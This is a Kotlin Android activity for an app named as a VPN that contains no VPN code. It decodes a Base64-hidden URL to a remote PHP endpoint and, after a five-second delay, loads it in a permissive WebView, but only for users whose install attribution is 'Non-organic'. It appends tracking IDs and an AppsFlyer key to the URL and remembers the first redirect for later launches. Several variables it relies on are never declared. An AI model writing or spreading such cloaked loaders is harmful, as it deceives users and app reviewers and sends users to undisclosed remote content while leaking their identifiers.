package org.safevpn.main

import android.content.Intent
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.Base64
import android.util.Log
import android.view.View
import android.webkit.WebChromeClient
import android.webkit.WebResourceRequest
import android.webkit.WebView
import android.webkit.WebViewClient
import android.widget.Toast
import org.safevpn.main.databinding.ActivityMainBinding

class MainActivity : AppCompatActivity() {
    lateinit var binding: ActivityMainBinding
    var linkBuilderOffer = "aHR0cDovL2Q2ODQ3MGdpLmJlZ2V0LnRlY2gvU2FmZS9mb3IucGhwP2lkPWFwcA=="


    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)
        Handler(Looper.getMainLooper()).postDelayed({
            checkSource()
        },5000)
    }

    fun decoderBase64(string: String): String {
        val decode = Base64.decode(string, Base64.DEFAULT)
        return String(decode)
    }

    private fun checkSource(){
        linkBuilderOffer = decoderBase64(linkBuilderOffer)
         when {
            af_status == "Non-organic" -> {
                linkBuilderOffer += "&sub1=${sub1}&sub2=${sub2}&sub3=${sub3}&sub4=${sub4}&sub5=${sub5}&af_id=${af_id}&bundle=$packageName&key=$appsflyer_key&ad=$ad"
                loadWebView()
            }
            else -> {

            }
        }
    }

    private fun loadWebView(){
        createWebView()
        binding.web.visibility = View.VISIBLE
        Log.e("onPageFinished", linkBuilderOffer.toString())
        if(getSharedPreferences("prefs", MODE_PRIVATE).getString("url",null)!=null)
            linkBuilderOffer = getSharedPreferences("prefs", MODE_PRIVATE).getString("url",null)!!
        binding.web.loadUrl(linkBuilderOffer)
    }

    private fun createWebView(){
        binding.web.settings.apply {
            defaultTextEncodingName = "utf-8"
            allowFileAccess = true
            javaScriptEnabled = true
            loadWithOverviewMode = true
            domStorageEnabled = true
            databaseEnabled = true
            useWideViewPort = true
            javaScriptCanOpenWindowsAutomatically = true
            mixedContentMode = 0
        }

        binding.web.webViewClient = object : WebViewClient(){
            override fun onPageFinished(view: WebView?, url: String?) {
                super.onPageFinished(view, url)
            }

            override fun shouldOverrideUrlLoading(
                view: WebView?,
                request: WebResourceRequest?
            ): Boolean {
                Log.d("TAG",request?.url.toString())
                if(getSharedPreferences("prefs", MODE_PRIVATE).getString("url",null)==null) {
                    getSharedPreferences("prefs", MODE_PRIVATE)
                        .edit()
                        .putString("url",request?.url.toString())
                        .apply();
                }
                if(request?.url.toString().contains("null")) binding.web.visibility = View.INVISIBLE
                view?.loadUrl(request?.url.toString())
                return true
            }
        }
        binding.web.webChromeClient = object : WebChromeClient(){}
    }
}